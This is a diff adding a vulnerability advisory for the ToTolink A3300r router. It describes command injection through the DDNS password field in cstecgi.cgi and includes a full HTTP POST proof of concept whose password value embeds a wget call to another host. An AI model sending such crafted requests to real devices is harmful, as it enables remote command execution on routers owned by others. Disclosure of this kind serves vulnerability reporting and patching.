@@ -1,0 +1,54 @@
+# ToTolink A3300r Vulnerability
+
+Vendor:ToTolink
+
+Product:A3300r
+
+Vulnerability: Command Injection
+
+Type:Command Injection Attack
+
+
+
+
+## Descriptions
+
+We found a command injection vulnerability  in `cstecgi.cgi` that could be triggered by an attacker through carefully crafted packet requests:
+
+
+<div  align="center"><img src="./img/sub_40E920.png" style="zoom:80%;" /></div>
+
+The sub_40E920 function defines a variable `password`, retrieves its value from the request  packet, and passes its value to the Uci_Set_Str function.
+
+<div  align="center"><img src="./img/uci.png" style="zoom:80%;" /></div>
+
+This function uses the sprintf function to concatenate it into v11, and finally passes the result to CsteSystem for processing.
+
+<div  align="center"><img src="./img/CsteSystem.png" style="zoom:80%;" /></div>
+
+However,the CsteSystem function wraps the command and then passes it to execv to execute the command.
+
+
+## Proof of Concept (PoC)
+
+We set `password` as **admin$(wget 192.168.6.1:8888/testpoc)"** ,such as:
+
+```http
+POST /cgi-bin/cstecgi.cgi HTTP/1.1
+Host: 192.168.6.2
+Content-Length: 248
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Origin: http://192.168.6.2
+Referer: http://192.168.6.2/wizard.html?token=
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{"enable":"1","provider":"3322.org","domain":"8.8.8.8","username":"admin","password":"admin$(wget 192.168.6.1:8888/testpoc)","topicurl":"setDdnsCfg"}
+```
+
+## outcome
+<div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
